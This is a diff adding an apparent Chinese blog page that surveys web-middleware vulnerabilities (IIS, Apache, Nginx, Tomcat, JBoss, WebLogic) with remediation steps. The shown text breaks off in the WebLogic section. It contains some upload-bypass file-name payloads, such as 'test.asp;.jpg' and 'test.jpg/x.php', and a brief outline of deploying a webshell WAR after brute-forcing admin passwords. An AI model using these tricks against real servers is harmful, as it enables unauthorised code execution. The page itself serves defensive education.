@@ -1,0 +1,678 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>hvv_中间件漏洞 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="hvv_中间件漏洞" />
+<meta property="og:description" content="HVV专题&ndash;中间件漏洞" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/hvv_middleware_bug/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:00:00+08:00" />
+<meta property="article:modified_time" content="2023-12-17T15:38:11+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="hvv_中间件漏洞"/>
+<meta name="twitter:description" content="HVV专题&ndash;中间件漏洞"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hvv_middleware_bug/" /><link rel="prev" href="http://scofield1920.github.io/hvv_post_penetration/" /><link rel="next" href="http://scofield1920.github.io/hvv_owasptop10/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "hvv_中间件漏洞",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/hvv_middleware_bug\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "hvv","wordcount":  483 ,
+        "url": "http:\/\/scofield1920.github.io\/hvv_middleware_bug\/","datePublished": "2023-11-17T00:00:00+08:00","dateModified": "2023-12-17T15:38:11+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#中间件">中间件：</a></li>
+    <li><a href="#常见中间件漏洞">常见中间件漏洞：</a>
+      <ul>
+        <li><a href="#0x1-iis">0x1 IIS</a>
+          <ul>
+            <li><a href="#1put漏洞">1、PUT漏洞</a></li>
+            <li><a href="#2短文件名猜解">2、短文件名猜解</a></li>
+            <li><a href="#3远程代码执行">3、远程代码执行</a></li>
+            <li><a href="#4解析漏洞">4、解析漏洞</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x2-apache">0x2 Apache</a>
+          <ul>
+            <li><a href="#1解析漏洞">1、解析漏洞</a></li>
+            <li><a href="#2目录遍历">2、目录遍历</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x3-nginx">0x3 Nginx</a>
+          <ul>
+            <li><a href="#1文件解析">1、文件解析</a></li>
+            <li><a href="#2目录遍历-1">2、目录遍历</a></li>
+            <li><a href="#3crlf注入">3、CRLF注入</a></li>
+            <li><a href="#4目录穿越">4、目录穿越</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x4-tomcat">0x4 Tomcat</a>
+          <ul>
+            <li><a href="#1远程代码执行">1、远程代码执行</a></li>
+            <li><a href="#2war后门文件部署">2、war后门文件部署</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x5-jboss">0x5 jBoss</a>
+          <ul>
+            <li><a href="#1反序列化漏洞">1、反序列化漏洞</a></li>
+            <li><a href="#2war后门文件部署-1">2、war后门文件部署</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x6-weblogic">0x6 WebLogic</a>
+          <ul>
+            <li><a href="#1反序列化漏洞-1">1、反序列化漏洞</a></li>
+            <li><a href="#2ssrf">2、SSRF</a></li>
+            <li><a href="#3任意文件上传">3、任意文件上传</a></li>
+            <li><a href="#4war后门文件部署">4、war后门文件部署</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x7-fastcgi">0x7 FastCGI</a>
+          <ul>
+            <li><a href="#未授权访问命令执行">未授权访问、命令执行</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x8-phpcgi">0x8 PHPCGI</a>
+          <ul>
+            <li><a href="#远程代码执行">远程代码执行</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x9-redis">0x9 Redis</a>
+          <ul>
+            <li><a href="#1未授权访问漏洞">1、未授权访问漏洞</a></li>
+            <li><a href="#2redis写入webshell">2、redis写入webshell</a></li>
+            <li><a href="#3redis写入ssh公钥登录">3、redis写入ssh公钥登录</a></li>
+            <li><a href="#4写入计划任务反弹shell">4、写入计划任务反弹shell</a></li>
+            <li><a href="#5主从复制rce">5、主从复制rce</a></li>
+            <li><a href="#6ssrfredis写入webshell">6、ssrf+redis写入webshell</a></li>
+            <li><a href="#7redis-lua-沙盒绕过rce">7、Redis Lua 沙盒绕过rce</a></li>
+            <li><a href="#8redis防御">8、Redis防御</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hvv_中间件漏洞</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-12-17">2023-12-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;483 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#中间件">中间件：</a></li>
+    <li><a href="#常见中间件漏洞">常见中间件漏洞：</a>
+      <ul>
+        <li><a href="#0x1-iis">0x1 IIS</a>
+          <ul>
+            <li><a href="#1put漏洞">1、PUT漏洞</a></li>
+            <li><a href="#2短文件名猜解">2、短文件名猜解</a></li>
+            <li><a href="#3远程代码执行">3、远程代码执行</a></li>
+            <li><a href="#4解析漏洞">4、解析漏洞</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x2-apache">0x2 Apache</a>
+          <ul>
+            <li><a href="#1解析漏洞">1、解析漏洞</a></li>
+            <li><a href="#2目录遍历">2、目录遍历</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x3-nginx">0x3 Nginx</a>
+          <ul>
+            <li><a href="#1文件解析">1、文件解析</a></li>
+            <li><a href="#2目录遍历-1">2、目录遍历</a></li>
+            <li><a href="#3crlf注入">3、CRLF注入</a></li>
+            <li><a href="#4目录穿越">4、目录穿越</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x4-tomcat">0x4 Tomcat</a>
+          <ul>
+            <li><a href="#1远程代码执行">1、远程代码执行</a></li>
+            <li><a href="#2war后门文件部署">2、war后门文件部署</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x5-jboss">0x5 jBoss</a>
+          <ul>
+            <li><a href="#1反序列化漏洞">1、反序列化漏洞</a></li>
+            <li><a href="#2war后门文件部署-1">2、war后门文件部署</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x6-weblogic">0x6 WebLogic</a>
+          <ul>
+            <li><a href="#1反序列化漏洞-1">1、反序列化漏洞</a></li>
+            <li><a href="#2ssrf">2、SSRF</a></li>
+            <li><a href="#3任意文件上传">3、任意文件上传</a></li>
+            <li><a href="#4war后门文件部署">4、war后门文件部署</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x7-fastcgi">0x7 FastCGI</a>
+          <ul>
+            <li><a href="#未授权访问命令执行">未授权访问、命令执行</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x8-phpcgi">0x8 PHPCGI</a>
+          <ul>
+            <li><a href="#远程代码执行">远程代码执行</a></li>
+          </ul>
+        </li>
+        <li><a href="#0x9-redis">0x9 Redis</a>
+          <ul>
+            <li><a href="#1未授权访问漏洞">1、未授权访问漏洞</a></li>
+            <li><a href="#2redis写入webshell">2、redis写入webshell</a></li>
+            <li><a href="#3redis写入ssh公钥登录">3、redis写入ssh公钥登录</a></li>
+            <li><a href="#4写入计划任务反弹shell">4、写入计划任务反弹shell</a></li>
+            <li><a href="#5主从复制rce">5、主从复制rce</a></li>
+            <li><a href="#6ssrfredis写入webshell">6、ssrf+redis写入webshell</a></li>
+            <li><a href="#7redis-lua-沙盒绕过rce">7、Redis Lua 沙盒绕过rce</a></li>
+            <li><a href="#8redis防御">8、Redis防御</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>HVV专题&ndash;中间件漏洞</p>
+<h2 id="中间件" class="headerLink">
+    <a href="#%e4%b8%ad%e9%97%b4%e4%bb%b6" class="header-mark"></a>中间件：</h2><p>中间件（Middleware）又称为web服务器或web容器，是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。</p>
+<p>常见的web中间件：</p>
+<ul>
+<li>IIS</li>
+<li>Apache</li>
+<li>Tomcat</li>
+<li>Nginx</li>
+<li>Jboss</li>
+<li>Weblogic</li>
+<li>WebSphere</li>
+</ul>
+<h2 id="常见中间件漏洞" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e4%b8%ad%e9%97%b4%e4%bb%b6%e6%bc%8f%e6%b4%9e" class="header-mark"></a>常见中间件漏洞：</h2><h3 id="0x1-iis" class="headerLink">
+    <a href="#0x1-iis" class="header-mark"></a>0x1 IIS</h3><p>IIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。</p>
+<h4 id="1put漏洞" class="headerLink">
+    <a href="#1put%e6%bc%8f%e6%b4%9e" class="header-mark"></a>1、PUT漏洞</h4><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。
+版本： IIS6.0</p>
+<p>**修复方法：**关闭WebDAV 和写权限</p>
+<h4 id="2短文件名猜解" class="headerLink">
+    <a href="#2%e7%9f%ad%e6%96%87%e4%bb%b6%e5%90%8d%e7%8c%9c%e8%a7%a3" class="header-mark"></a>2、短文件名猜解</h4><p>IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。</p>
+<p><strong>修复方法：</strong>
+1）升级.net framework</p>
+<p>2）修改注册表禁用短文件名功能
+快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径：
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效</p>
+<p>3）CMD关闭NTFS 8.3文件格式的支持</p>
+<p>4）将web文件夹的内容拷贝到另一个位置，如c:\www到d:\w,然后删除原文件夹，再重命名d:\w到c:\www。</p>
+<h4 id="3远程代码执行" class="headerLink">
+    <a href="#3%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>3、远程代码执行</h4><p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p>
+<p><strong>修复方法：</strong></p>
+<p>1）关闭 WebDAV 服务</p>
+<p>2） 使用相关防护设备</p>
+<h4 id="4解析漏洞" class="headerLink">
+    <a href="#4%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="header-mark"></a>4、解析漏洞</h4><p>IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/test.asp/test.jpgtest.asp;.jpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>第一种</strong>是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ）
+<strong>第二种</strong>是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行</p>
+<p>IIS7.5 文件解析漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">test.jpg/.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ”</p>
+<p>即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。</p>
+<p>若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p>
+<p><strong>修复方法：</strong></p>
+<p>1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件
+2）曲线网站后台新建目录的功能，不允许新建目录
+3）限制上传的脚本执行权限，不允许执行脚本
+4）过滤.asp/xm.jpg，通过ISApi组件过滤</p>
+<h3 id="0x2-apache" class="headerLink">
+    <a href="#0x2-apache" class="header-mark"></a>0x2 Apache</h3><p>Apache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。</p>
+<h4 id="1解析漏洞" class="headerLink">
+    <a href="#1%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="header-mark"></a>1、解析漏洞</h4><p>Apache文件解析漏洞严格来说属于用户配置问题。</p>
+<p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">yyy-&gt;无法识别，向左xxx-&gt;无法识别，向左
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>php-&gt;发现后缀是php，交给php处理这个文件</p>
+<p>**修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。</p>
+<h4 id="2目录遍历" class="headerLink">
+    <a href="#2%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86" class="header-mark"></a>2、目录遍历</h4><p>由于配置错误导致的目录遍历</p>
+<p><strong>修复方法：</strong></p>
+<p>修改apache配置文件httpd.conf</p>
+<p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p>
+<h3 id="0x3-nginx" class="headerLink">
+    <a href="#0x3-nginx" class="header-mark"></a>0x3 Nginx</h3><p>Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好</p>
+<h4 id="1文件解析" class="headerLink">
+    <a href="#1%e6%96%87%e4%bb%b6%e8%a7%a3%e6%9e%90" class="header-mark"></a>1、文件解析</h4><p>对任意文件名，在后面添加<code>/</code>任意文件名<code>.php</code>的解析漏洞，比如原本文件名是<code>test.jpg</code>，可以添加<code>test.jpg/x.php</code>进行解析攻击。</p>
+<p><strong>修复方法：</strong></p>
+<p>1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404；</p>
+<p>2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php</p>
+<h4 id="2目录遍历-1" class="headerLink">
+    <a href="#2%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86-1" class="header-mark"></a>2、目录遍历</h4><p>Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。</p>
+<p><strong>修复方法：</strong></p>
+<p>将<code>/etc/nginx/sites-avaliable/default</code>里的<code>autoindex on</code>改为<code>autoindex off</code></p>
+<h4 id="3crlf注入" class="headerLink">
+    <a href="#3crlf%e6%b3%a8%e5%85%a5" class="header-mark"></a>3、CRLF注入</h4><p>CRLF即“回车+换行”（\r\n）</p>
+<p>HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。</p>
+<p>通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。</p>
+<p><strong>修复方法：</strong></p>
+<p>Nginx的配置文件<code>/etc/nginx/conf.d/error1.conf</code>修改为使用不解码的url跳转。</p>
+<h4 id="4目录穿越" class="headerLink">
+    <a href="#4%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a" class="header-mark"></a>4、目录穿越</h4><p>Nginx反向代理，静态文件存储在<code>/home/</code>下，而访问时需要在url中输入<code>files</code>，配置文件中<code>/files</code>没有用<code>/</code>闭合，导致可以穿越至上层目录。</p>
+<p>**修复方案：**Nginx的配置文件<code>/etc/nginx/conf.d/error2.conf</code>的<code>/files</code>使用/闭合。</p>
+<h3 id="0x4-tomcat" class="headerLink">
+    <a href="#0x4-tomcat" class="header-mark"></a>0x4 Tomcat</h3><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
+<p>可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。</p>
+<p>实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
+<h4 id="1远程代码执行" class="headerLink">
+    <a href="#1%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>1、远程代码执行</h4><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
+<p><strong>影响版本：</strong> Apache Tomcat 7.0.0 – 7.0.81</p>
+<p><strong>修复方法：</strong></p>
+<p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
+<p>2）更新并升级至最新版。</p>
+<h4 id="2war后门文件部署" class="headerLink">
+    <a href="#2war%e5%90%8e%e9%97%a8%e6%96%87%e4%bb%b6%e9%83%a8%e7%bd%b2" class="header-mark"></a>2、war后门文件部署</h4><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
+<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
+<p><strong>修复方法：</strong></p>
+<p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
+<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p>
+<p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p>
+<p>4）后台管理避免弱口令。</p>
+<h3 id="0x5-jboss" class="headerLink">
+    <a href="#0x5-jboss" class="header-mark"></a>0x5 jBoss</h3><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<h4 id="1反序列化漏洞" class="headerLink">
+    <a href="#1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="header-mark"></a>1、反序列化漏洞</h4><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
+<p><strong>修复方法：</strong></p>
+<p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p>
+<p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
+<p>2）用于对 httpinvoker 组件进行访问控制。</p>
+<h4 id="2war后门文件部署-1" class="headerLink">
+    <a href="#2war%e5%90%8e%e9%97%a8%e6%96%87%e4%bb%b6%e9%83%a8%e7%bd%b2-1" class="header-mark"></a>2、war后门文件部署</h4><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
+<h3 id="0x6-weblogic" class="headerLink">
+    <a href="#0x6-weblogic" class="header-mark"></a>0x6 WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个<code>application server</code>，确切的说是一个基于JAVAEE架构的<a href="https://cloud.tencent.com/product/tdmq?from=20065&amp;from_column=20065" target="_blank" rel="noopener noreferrer">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和<a href="https://cloud.tencent.com/solution/database?from=20065&amp;from_column=20065" target="_blank" rel="noopener noreferrer">数据库</a>应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<h4 id="1反序列化漏洞-1" class="headerLink">
+    <a href="#1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-1" class="header-mark"></a>1、反序列化漏洞</h4><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
+<p><strong>修复方法：</strong></p>
+<p>1）升级Oracle 10月份补丁。</p>
